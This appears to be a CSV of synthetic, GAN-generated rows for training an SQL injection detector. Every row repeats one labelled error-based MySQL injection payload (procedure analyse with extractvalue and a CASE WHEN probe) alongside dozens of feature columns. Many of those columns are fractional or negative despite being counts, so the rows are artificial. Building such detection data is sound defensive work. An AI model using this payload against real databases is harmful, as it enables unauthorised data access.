id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000111,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.027248448753121,270.3540954589844,82.19249725341797,40.40824508666992,104.23552703857422,6.204390048980713,83.4146728515625,37.026248931884766,0.884465754032135,0.31914761662483215,0.15822938084602356,0.3875400722026825,0.12930478155612946,3.86330246925354,1.673087239265442,0.3850686848163605,0.4047296941280365,0.09401199221611023,-0.003398155327886343,-0.0017757099121809006,9.440384864807129,10.38892936706543,3.7872118949890137,0.17444807291030884,1.877421498298645,0.1814555525779724,-0.02363252267241478,0.2034391611814499,0.038785744458436966,0.7970229387283325,0.163772314786911,-0.08667998015880585,2.047123908996582,-0.12001015245914459,0.29406502842903137,2.107409954071045,7.9454345703125,1.0459904670715332,2.4611661434173584,0.5526266098022461,0.31904855370521545,0.8742054104804993,0.06533431261777878,0.03226722776889801,-0.03018994629383087,0.14336369931697845,0.04136540740728378,0.3282855451107025,0.3691122829914093,0.4110039174556732,0.31282368302345276,0.36495983600616455,0.10300195962190628,-0.06456166505813599,0.40789055824279785,0.088041290640831,0.1207684725522995,-0.1269223690032959,-0.1128971129655838,0.14745071530342102,-0.022628359496593475,-0.058580394834280014,0.12559635937213898,-0.0276054535061121,0.028905697166919708,-0.07447498291730881,0.6026465892791748,-0.0062991902232170105,-0.04290202632546425,0.021886028349399567,0.0849868580698967,0.0707351341843605,-0.032462023198604584,-0.04592482000589371,-0.025529470294713974,-0.0747518539428711,1.0514731407165527,0.4947403073310852,0.15766094624996185,0.1428767889738083,0.4739084541797638,9.993915557861328,0.7430427074432373,0.19820576906204224,0.045660536736249924,0.740986704826355,-0.04245664179325104,0.08622004091739655,0.12220612168312073
GAN_000112,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.047299581614525,270.36053466796875,80.60813903808594,41.00004959106445,102.66185760498047,4.7439799308776855,82.24378967285156,36.70975875854492,0.9128116965293884,0.3076851963996887,0.1568882018327713,0.3920597732067108,0.12646402418613434,3.8254213333129883,1.4315040111541748,0.6576383709907532,0.45487725734710693,0.11993593722581863,-0.010341761633753777,-0.22326073050498962,9.350395202636719,10.653087615966797,3.313523530960083,0.19814082980155945,1.9347774982452393,0.22335079312324524,-0.027826327830553055,0.22697512805461884,0.059476759284734726,0.7207509279251099,0.15034621953964233,0.040919721126556396,2.042025327682495,-0.19260479509830475,0.31305748224258423,2.1243536472320557,8.017678260803223,1.134805679321289,2.5507357120513916,0.518742024898529,0.2834770083427429,0.8324024081230164,-0.0070142969489097595,0.03657422214746475,-0.000809401273727417,-0.01228402554988861,0.0861755982041359,0.31327953934669495,0.35444289445877075,0.37921953201293945,0.34433257579803467,0.39855843782424927,0.003388352692127228,0.10593599826097488,0.4107217788696289,0.12275426834821701,0.13539282977581024,-0.005170432850718498,-0.22283028066158295,0.12517230212688446,0.09389699250459671,-0.0764794871211052,-0.024704985320568085,0.05075085908174515,0.06045696511864662,-0.054040126502513885,0.7392183542251587,-0.09978801757097244,-0.15362510085105896,0.05933881923556328,0.15972840785980225,-0.07111690938472748,-0.028515994548797607,-0.1352883279323578,0.007398867979645729,0.10944513976573944,1.0073753595352173,0.4939228296279907,0.1380942463874817,0.16192583739757538,0.4645332396030426,9.715191841125488,0.7096037268638611,0.1833990216255188,0.04466389864683151,0.7609453797340393,-0.016235122457146645,-0.11677740514278412,0.05372324585914612
GAN_000113,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.039101510623841,269.047119140625,81.81636047363281,40.578330993652344,105.1416015625,6.965941429138184,83.42911529541016,37.32137680053711,0.9217138290405273,0.3135509788990021,0.15758977830410004,0.3877885341644287,0.126290425658226,3.85414981842041,1.6010326147079468,0.32223960757255554,0.39720141887664795,0.10267858952283859,0.03139267861843109,0.042058736085891724,9.47359561920166,10.454133987426758,3.874603748321533,0.22516316175460815,1.8532652854919434,0.228364035487175,-0.10700118541717529,0.21971318125724792,0.08511874079704285,0.7414922714233398,0.2086358219385147,0.016523689031600952,2.008589267730713,-0.16727732121944427,0.29266929626464844,2.0790956020355225,8.001580238342285,0.9322289228439331,2.311211585998535,0.47718557715415955,0.3015955090522766,0.8718337416648865,-0.030046485364437103,0.03648374229669571,-0.03682535141706467,0.08060061186552048,0.12745696306228638,0.31439128518104553,0.3939730226993561,0.3876364827156067,0.3054081201553345,0.35770273208618164,0.122886061668396,-0.11006477475166321,0.411417156457901,0.133158877491951,0.09618217498064041,-0.03512722626328468,-0.13728642463684082,0.07547794282436371,0.08430639654397964,0.11742309480905533,0.17926086485385895,-0.04516782611608505,0.03570862114429474,-0.0049614571034908295,0.6009593605995178,-0.009260393679141998,-0.10131349414587021,0.0047872960567474365,-0.07823708653450012,-0.041514430195093155,-0.16838660836219788,-0.10767654329538345,-0.07345391064882278,-0.021771851927042007,1.072023630142212,0.4772767722606659,0.2702905237674713,0.10030624270439148,0.43027880787849426,9.688270568847656,0.7513582110404968,0.22088541090488434,0.019065700471401215,0.7615016102790833,-0.0574508011341095,0.13903747498989105,0.1018846333026886
GAN_000114,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,4.982849323077702,270.166748046875,84.51756286621094,39.71868133544922,105.28153228759766,3.391883373260498,81.65200805664062,37.2654914855957,0.9562809467315674,0.30722859501838684,0.1546190232038498,0.38903018832206726,0.12697206437587738,3.8329856395721436,1.6821948289871216,0.6372355818748474,0.5101727247238159,0.04705607891082764,0.02135603129863739,-0.09023235738277435,9.123819351196289,10.382935523986816,3.8650319576263428,0.14807087182998657,1.8409234285354614,0.14522525668144226,-0.05768345296382904,0.1358644664287567,0.054165713489055634,0.734806478023529,0.18717311322689056,0.10179874300956726,1.970088005065918,-0.07608042657375336,0.3638499975204468,1.9306910037994385,7.809473514556885,1.0198780298233032,2.429938316345215,0.5380552411079407,0.2600339651107788,0.8531691431999207,-0.06590902805328369,0.031980376690626144,-0.12463728338479996,0.08767341077327728,0.09824193269014359,0.28588706254959106,0.2953243851661682,0.3699572682380676,0.2621593177318573,0.4298497438430786,0.09154977649450302,-0.060519084334373474,0.3717402517795563,0.10382737219333649,0.14646577835083008,0.006577402353286743,-0.018723733723163605,0.21614529192447662,-0.03846059367060661,0.04748879373073578,0.08623293787240982,-0.007881153374910355,0.0427434928715229,-0.009119577705860138,0.6882026195526123,-0.047689296305179596,-0.14942309260368347,0.015108846127986908,0.028853341937065125,-0.1085439994931221,-0.051317133009433746,-0.019033141434192657,-0.003933854401111603,0.02530236542224884,1.1009081602096558,0.4921167492866516,0.14399081468582153,0.07648009061813354,0.4032588005065918,9.46493148803711,0.7730608582496643,0.2043939083814621,0.02000492624938488,0.7754068374633789,0.03815664350986481,0.012124110013246536,-0.015894196927547455
GAN_000115,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,4.9669599511555225,270.5404357910156,83.9395980834961,40.471214294433594,103.12166595458984,5.10949182510376,83.08638763427734,37.42464065551758,0.9392334818840027,0.3082122504711151,0.15654627978801727,0.3876851797103882,0.1267271786928177,3.8683435916900635,1.8032739162445068,0.3013666868209839,0.41126808524131775,0.05277112126350403,0.06881321221590042,0.039198558777570724,9.57148551940918,10.37019157409668,3.966228485107422,0.14676734805107117,1.7562257051467896,0.17130833864212036,-0.12749119102954865,0.16780316829681396,0.040176715701818466,0.7056461572647095,0.19941885769367218,0.006075337529182434,1.9333765506744385,-0.08603416383266449,0.29037249088287354,2.004953384399414,7.847536563873291,0.9017785787582397,2.2474825382232666,0.5546951293945312,0.28492504358291626,0.8745492100715637,-0.012904427945613861,0.016003238037228584,-0.08142559230327606,0.18466275930404663,0.11717934161424637,0.32051655650138855,0.37061256170272827,0.38065269589424133,0.2747333347797394,0.4139024317264557,0.12111027538776398,-0.17832157015800476,0.3996225595474243,0.11421965062618256,0.11841998249292374,-0.0065765902400016785,-0.1277628093957901,0.22808067500591278,0.03819920867681503,0.10273440927267075,0.17343086004257202,0.016832929104566574,0.03919089585542679,0.05958011746406555,0.5793673992156982,-0.0771438404917717,-0.14500047266483307,-0.04199693351984024,-0.029859378933906555,-0.04821544140577316,-0.13484254479408264,-0.08106020838022232,-0.10170959681272507,-0.028282273560762405,1.0508185625076294,0.4620037376880646,0.1930830180644989,0.08299966156482697,0.4645475149154663,9.34674072265625,0.8129196166992188,0.23991890251636505,0.010897343046963215,0.8271374702453613,0.035472556948661804,0.14626732468605042,0.08495020866394043
GAN_000116,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,4.872998149086874,270.4435729980469,85.19100189208984,40.349822998046875,105.06147003173828,3.3436291217803955,80.07473754882812,36.228397369384766,0.8647106885910034,0.31043893098831177,0.1572735607624054,0.39095044136047363,0.12526652216911316,3.8763415813446045,1.6851359605789185,0.6041044592857361,0.4875439405441284,0.06344113498926163,0.19431288540363312,-0.007932867854833603,9.351853370666504,10.419350624084473,3.9034829139709473,0.10874297469854355,1.7935891151428223,0.1861036866903305,0.024915184825658798,0.142277330160141,0.09737478196620941,0.7614116668701172,0.17280693352222443,-0.038094766438007355,1.8744648694992065,-0.10396578907966614,0.3211062550544739,1.9627737998962402,7.772015571594238,1.136375904083252,2.387838363647461,0.4937916100025177,0.30481746792793274,0.8182567358016968,-0.03614496439695358,0.03176754713058472,-0.19770774245262146,0.01731044054031372,0.1293218731880188,0.3565281331539154,0.39704930782318115,0.4032355844974518,0.3297915458679199,0.3959231972694397,0.11513197422027588,-0.053892649710178375,0.3709307014942169,0.1250254511833191,0.13941216468811035,0.012716513127088547,-0.0989840179681778,0.17243269085884094,-0.06540697813034058,-0.06331627070903778,0.06305193901062012,-0.0067021846771240234,0.02950969897210598,-0.05166974663734436,0.606376588344574,-0.019794702529907227,-0.05829527601599693,0.08470724523067474,0.05128340423107147,-0.06401587277650833,0.012774761766195297,-0.08312525600194931,-0.022016648203134537,-0.09316296875476837,1.1014482975006104,0.49084997177124023,0.13414551317691803,0.09732316434383392,0.4294024705886841,9.197457313537598,0.7616940140724182,0.20498906075954437,0.040243640542030334,0.7943856716156006,0.1442795842885971,-0.025130264461040497,0.07251350581645966
GAN_000117,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,4.942138960702747,269.1445007324219,82.48394012451172,38.715003967285156,100.848876953125,5.09902286529541,80.82728576660156,37.036773681640625,0.9004972577095032,0.30924221873283386,0.15438212454319,0.3904286324977875,0.12540790438652039,3.8293228149414062,1.5423429012298584,0.5596174597740173,0.411459743976593,0.058695487678050995,0.08372348546981812,-0.15150994062423706,9.14523696899414,10.158404350280762,3.3086605072021484,0.22310909628868103,1.8493210077285767,0.17099684476852417,-0.07366233319044113,0.17865633964538574,0.1077553853392601,0.6434326767921448,0.1608189046382904,0.07610100507736206,2.0132596492767334,-0.09977753460407257,0.3015124797821045,1.9697320461273193,7.5703349113464355,1.150317668914795,2.478829860687256,0.5532928109169006,0.30299267172813416,0.7755998969078064,0.08227065205574036,0.04607138782739639,-0.097879558801651,-0.0534517765045166,0.18969184160232544,0.3422870934009552,0.3247414231300354,0.34562426805496216,0.35656309127807617,0.3587598204612732,-0.03572468459606171,-0.006705716252326965,0.4135468900203705,0.10618196427822113,0.11338227987289429,-0.045349813997745514,-0.184594064950943,0.22115114331245422,-0.02695821225643158,-0.16786226630210876,0.07207092642784119,0.01767745614051819,0.06383146345615387,0.028413131833076477,0.6899498105049133,-0.13347959518432617,-0.12366321682929993,-0.03628086298704147,0.0991341769695282,-0.1992221176624298,-0.03197865188121796,-0.07986005395650864,-0.01367307547479868,0.07385782897472382,1.0894851684570312,0.43393394351005554,0.12304458022117615,0.1558665782213211,0.4779723882675171,9.144929885864258,0.7069810032844543,0.18747447431087494,0.045560840517282486,0.8107152581214905,0.05157993733882904,-0.2505890130996704,-0.010721847414970398
GAN_000118,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.093045268962662,261.00872802734375,88.65614318847656,38.37641906738281,102.13717651367188,4.727499008178711,78.25408172607422,38.17744064331055,1.0857316255569458,0.3211445212364197,0.15498414635658264,0.3895123302936554,0.12612773478031158,3.8250865936279297,1.9409421682357788,0.5329835414886475,0.44689875841140747,0.010246255435049534,0.06373924016952515,0.07155407965183258,9.76836109161377,9.885003089904785,4.22463846206665,0.2608620822429657,1.845840334892273,0.09398134797811508,0.09475943446159363,0.21873240172863007,0.02958458662033081,0.748948872089386,0.15142536163330078,0.21225211024284363,1.8865050077438354,0.040611207485198975,0.34757521748542786,1.9874823093414307,7.041018486022949,0.77411288022995,2.478469133377075,0.6091166734695435,0.3661278486251831,0.8738861680030823,-0.015402249991893768,0.014963296242058277,-0.15698175132274628,0.13684460520744324,-0.011270537972450256,0.3388552665710449,0.2096463441848755,0.3228974938392639,0.18548516929149628,0.5193436145782471,-0.1538236439228058,-0.027476675808429718,0.48541805148124695,0.07115219533443451,0.10601641982793808,-0.1695539802312851,0.2036302089691162,0.2545669972896576,0.024753928184509277,0.21911168098449707,0.1420300155878067,0.03299872577190399,0.03267446905374527,0.1344044804573059,0.6319870352745056,-0.11373748630285263,-0.23516929149627686,-0.08110923320055008,0.08216032385826111,-0.17655596137046814,-0.10518550872802734,-0.06869528442621231,-0.03424553573131561,0.004738505929708481,1.1152939796447754,0.47128647565841675,0.1008106991648674,-0.01900472491979599,0.36581093072891235,9.215088844299316,0.7739914655685425,0.22619232535362244,0.005191543605178595,0.786094069480896,-0.18171003460884094,0.13398194313049316,0.04136890172958374
GAN_000119,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.130927304641797,271.37640380859375,84.887939453125,39.3416633605957,99.29553985595703,5.691256046295166,83.99214172363281,38.32048797607422,1.105877161026001,0.3026049733161926,0.1569722294807434,0.38617923855781555,0.12626659870147705,3.841031074523926,1.6622241735458374,0.3145774304866791,0.4298970699310303,0.005719446577131748,-0.06019771471619606,-0.07337125390768051,9.83074951171875,10.124556541442871,3.761526107788086,0.22264815866947174,1.8008432388305664,0.13046662509441376,0.018392622470855713,0.2476769983768463,0.01409356202930212,0.5755459070205688,0.21495890617370605,0.1353355348110199,1.9707587957382202,-0.03565891459584236,0.3268674910068512,2.0253005027770996,7.404658317565918,0.8650699853897095,2.304107427597046,0.5792035460472107,0.3064660429954529,0.8923996686935425,0.021058283746242523,0.0019118894124403596,-0.11556826531887054,0.16090385615825653,0.04048994928598404,0.33748021721839905,0.2805958092212677,0.31622228026390076,0.2257542908191681,0.4552866816520691,-0.09169793874025345,-0.11763882637023926,0.43578964471817017,0.08657310158014297,0.12413202226161957,0.017723284661769867,-0.022113151848316193,0.3790610134601593,-0.010832130908966064,0.16070997714996338,0.09237053990364075,0.0013155639171600342,0.05748966336250305,0.09913168102502823,0.6370218992233276,-0.26265817880630493,-0.26873740553855896,-0.18770521879196167,0.12878187000751495,-0.16686269640922546,-0.21880418062210083,-0.25215426087379456,-0.028230521827936172,0.038268376141786575,0.9907510876655579,0.5030055046081543,0.133573979139328,0.07457878440618515,0.4134412407875061,9.126008987426758,0.8128042221069336,0.311461478471756,0.007555935066193342,0.8096602559089661,-0.17539744079113007,-0.11159996688365936,0.094866082072258
GAN_000120,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,4.941095575114614,272.4530029296875,82.71028137207031,42.157447814941406,101.6761245727539,3.0159807205200195,80.94009399414062,36.94437789916992,1.0500062704086304,0.31084802746772766,0.15576468408107758,0.39236465096473694,0.12877775728702545,3.8094868659973145,1.7876341342926025,0.6267631649971008,0.5270478129386902,0.10400169342756271,0.005142096430063248,-0.047362349927425385,9.230437278747559,10.226452827453613,3.6863887310028076,0.14785826206207275,1.843413233757019,0.17502090334892273,0.025164570659399033,0.3076998293399811,0.07442399114370346,0.735586404800415,0.2359045147895813,0.03773161768913269,1.961486577987671,-0.04612302780151367,0.2725631892681122,2.1574668884277344,7.810601234436035,0.954077422618866,2.378023386001587,0.5014691352844238,0.2724800407886505,0.816419243812561,0.08892478793859482,0.02605661377310753,-0.0868789553642273,0.16395191848278046,-0.042321495711803436,0.40655288100242615,0.29005542397499084,0.3220294415950775,0.32723015546798706,0.47127559781074524,-0.10660969465970993,0.04009953886270523,0.4005413055419922,0.13542473316192627,0.16953322291374207,0.18615180253982544,-0.2067318558692932,0.11868943274021149,0.039478205144405365,0.059214554727077484,-0.009448662400245667,0.11290685087442398,0.04895110800862312,-0.06938774138689041,0.7016698718070984,-0.1521286815404892,-0.09174691885709763,-0.06514181941747665,0.1402764916419983,-0.14509958028793335,-0.19288241863250732,-0.0320705845952034,0.037039924412965775,0.14980259537696838,0.996116042137146,0.4508277177810669,0.1631108522415161,0.11074520647525787,0.38476547598838806,9.683470726013184,0.6892538070678711,0.21790124475955963,0.006295870523899794,0.7685921788215637,-0.10535703599452972,-0.023858046159148216,-0.0945250615477562
GAN_000121,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,4.880228955335516,269.26617431640625,86.61270141601562,39.88248062133789,103.13397216796875,4.868373394012451,81.58304595947266,36.831851959228516,1.1398494243621826,0.3129690885543823,0.1550474315881729,0.3920183479785919,0.12670594453811646,3.8658058643341064,1.8097929954528809,0.6575555205345154,0.450910359621048,0.013147317804396152,0.0437118299305439,-0.08415696769952774,9.483442306518555,10.151333808898926,3.8888602256774902,0.16962313652038574,1.8705285787582397,0.13089679181575775,0.05640660226345062,0.18196642398834229,0.03020845726132393,0.6949697732925415,0.15826642513275146,0.1139804869890213,1.89835786819458,-0.05135975033044815,0.31428253650665283,1.9163309335708618,7.4365620613098145,0.9392719864845276,2.3824121952056885,0.5549964904785156,0.3070216774940491,0.7967418432235718,-0.14805158972740173,0.027614420279860497,-0.29714614152908325,0.1545746922492981,-0.0330316424369812,0.39932242035865784,0.29012331366539,0.3407473564147949,0.2996419668197632,0.5035845041275024,-0.22387054562568665,-0.035899240523576736,0.4664892256259918,0.1158861368894577,0.08777149766683578,-0.07492746412754059,0.19842174649238586,0.13201242685317993,-0.16210176050662994,0.2887124717235565,0.032792627811431885,0.024214006960392,0.0216190367937088,-0.044619567692279816,0.5902256369590759,-0.1398564875125885,-0.03611661121249199,-0.0392378494143486,0.0628650113940239,-0.03541991114616394,0.02725934609770775,-0.010653756558895111,0.09456339478492737,-0.060393597930669785,0.9459609389305115,0.43010830879211426,0.19675272703170776,0.02076447755098343,0.3866255581378937,9.06218147277832,0.7741187810897827,0.22896230220794678,0.003971289377659559,0.7600420117378235,0.013511747121810913,0.12839600443840027,0.16702227294445038
GAN_000122,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.0333799984575265,273.199951171875,84.60736846923828,40.5699577331543,100.63265991210938,4.084749698638916,80.71812438964844,37.46685791015625,1.0728964805603027,0.29316285252571106,0.16015540063381195,0.38982972502708435,0.12772397696971893,3.798180103302002,1.7659835815429688,0.5531757473945618,0.5141865611076355,0.1066594272851944,0.04135095328092575,0.03513956815004349,8.695525169372559,10.418739318847656,3.6478230953216553,0.13446374237537384,1.8041038513183594,0.1610843688249588,-0.14071154594421387,0.20089541375637054,0.11709557473659515,0.740905225276947,0.2915695905685425,0.12591533362865448,2.0192489624023438,0.0035215653479099274,0.29267019033432007,1.915244221687317,7.835827350616455,0.8676908016204834,2.094811201095581,0.5815873742103577,0.15248626470565796,0.7999759912490845,-0.1120351105928421,0.04899623617529869,-0.24037370085716248,0.03195605427026749,0.17017534375190735,0.37585335969924927,0.30759117007255554,0.29013603925704956,0.24026398360729218,0.3902950882911682,0.031535208225250244,0.009476594626903534,0.3337485194206238,0.11659364402294159,0.15736763179302216,0.17080657184123993,-0.06264037638902664,-0.0353253111243248,-0.0795285701751709,0.03513374924659729,0.03886474668979645,0.05369820445775986,0.04400042071938515,-0.17642226815223694,0.7015257477760315,-0.028192564845085144,-0.03198370337486267,0.052281733602285385,0.05648649483919144,-0.13663220405578613,-0.244003564119339,0.10322777926921844,0.11980310827493668,0.09538936614990234,1.1206215620040894,0.445316344499588,0.17016974091529846,0.08916965872049332,0.47220727801322937,9.264140129089355,0.7170509696006775,0.21580660343170166,0.0027091705705970526,0.763174831867218,0.048090867698192596,5.3882598876953125e-05,-0.17177098989486694
GAN_000123,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,4.95911576322682,274.158203125,84.77735137939453,39.76395797729492,102.10045623779297,3.0571513175964355,78.93708038330078,36.9167366027832,1.0972987413406372,0.3062983751296997,0.1547255665063858,0.3899000883102417,0.12719221413135529,3.8347206115722656,1.784632682800293,0.7143479585647583,0.5262514352798462,0.05625395476818085,0.25230035185813904,-0.07788985967636108,9.237289428710938,10.370293617248535,3.8816537857055664,0.056070517748594284,1.8059591054916382,0.1406664252281189,-0.0568496398627758,0.12161066383123398,0.10655317455530167,0.7930499911308289,0.28132861852645874,0.1047874391078949,1.941967248916626,-0.075199194252491,0.3200780749320984,1.9566878080368042,8.07943058013916,0.9889770746231079,2.2372286319732666,0.5426393151283264,0.21073365211486816,0.8052241802215576,-0.14835399389266968,0.04286249727010727,-0.3460831642150879,0.08738989382982254,0.0867076888680458,0.38301438093185425,0.3212164640426636,0.3490550220012665,0.22768624126911163,0.4265841543674469,-0.0637899860739708,0.062458790838718414,0.37923920154571533,0.11537335067987442,0.14856010675430298,0.050797369331121445,0.035335980355739594,0.10775882005691528,-0.07946230471134186,0.1393992006778717,0.04999995231628418,0.028740495443344116,0.026969533413648605,-0.21494323015213013,0.6524862051010132,-0.023487813770771027,-0.04657454788684845,0.09703166037797928,0.04781150445342064,0.021513940766453743,-0.02811514586210251,0.12232068926095963,0.16558974981307983,-0.06892220675945282,1.0906808376312256,0.4364997446537018,0.17202767729759216,0.04756392538547516,0.4098372161388397,9.452040672302246,0.7247792482376099,0.20038782060146332,0.028673961758613586,0.7970942258834839,0.17096111178398132,0.1889186054468155,-0.05148591846227646
GAN_000124,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,5.128315659942877,268.0557556152344,84.21952056884766,38.95905303955078,106.69384002685547,5.746962547302246,82.33644104003906,38.55763244628906,0.7771348357200623,0.3249298334121704,0.1513644903898239,0.3867165744304657,0.12939363718032837,3.8389666080474854,1.7551562786102295,0.3626514971256256,0.3406642973423004,0.03713282197713852,0.04817470535635948,0.09317866712808609,9.438158988952637,10.164037704467773,4.174412727355957,0.36520159244537354,1.8917139768600464,0.15864168107509613,-0.08692147582769394,0.1952095627784729,0.023674307391047478,0.8068865537643433,-0.006164915859699249,0.07836258411407471,1.8917895555496216,-0.2601684033870697,0.31252342462539673,2.0819790363311768,7.861626148223877,0.8785998225212097,2.560866594314575,0.5050840973854065,0.3003784716129303,0.9318192601203918,-0.01922205090522766,0.03187122195959091,-0.04162765294313431,0.22807738184928894,0.009956136345863342,0.3457721471786499,0.31860247254371643,0.3209307789802551,0.2707130014896393,0.4051308333873749,-0.013050444424152374,-0.09525277465581894,0.4532490074634552,0.05122280865907669,0.03999897837638855,-0.14370372891426086,0.029579244554042816,0.17527860403060913,0.09101573377847672,0.06485230475664139,0.05880964547395706,-0.013213161379098892,0.025774259120225906,0.06629825383424759,0.5578396320343018,-0.04025993496179581,-0.12609289586544037,-0.002162732183933258,-0.020127400755882263,0.012361319735646248,-0.1222882866859436,-0.1169152781367302,-0.015371293760836124,-0.04440942034125328,1.1189534664154053,0.480789452791214,0.2802237868309021,0.07451143860816956,0.4003623425960541,9.767297744750977,0.7352675795555115,0.20517544448375702,0.019473208114504814,0.7223235368728638,-0.20962049067020416,0.12647061049938202,0.1105569452047348
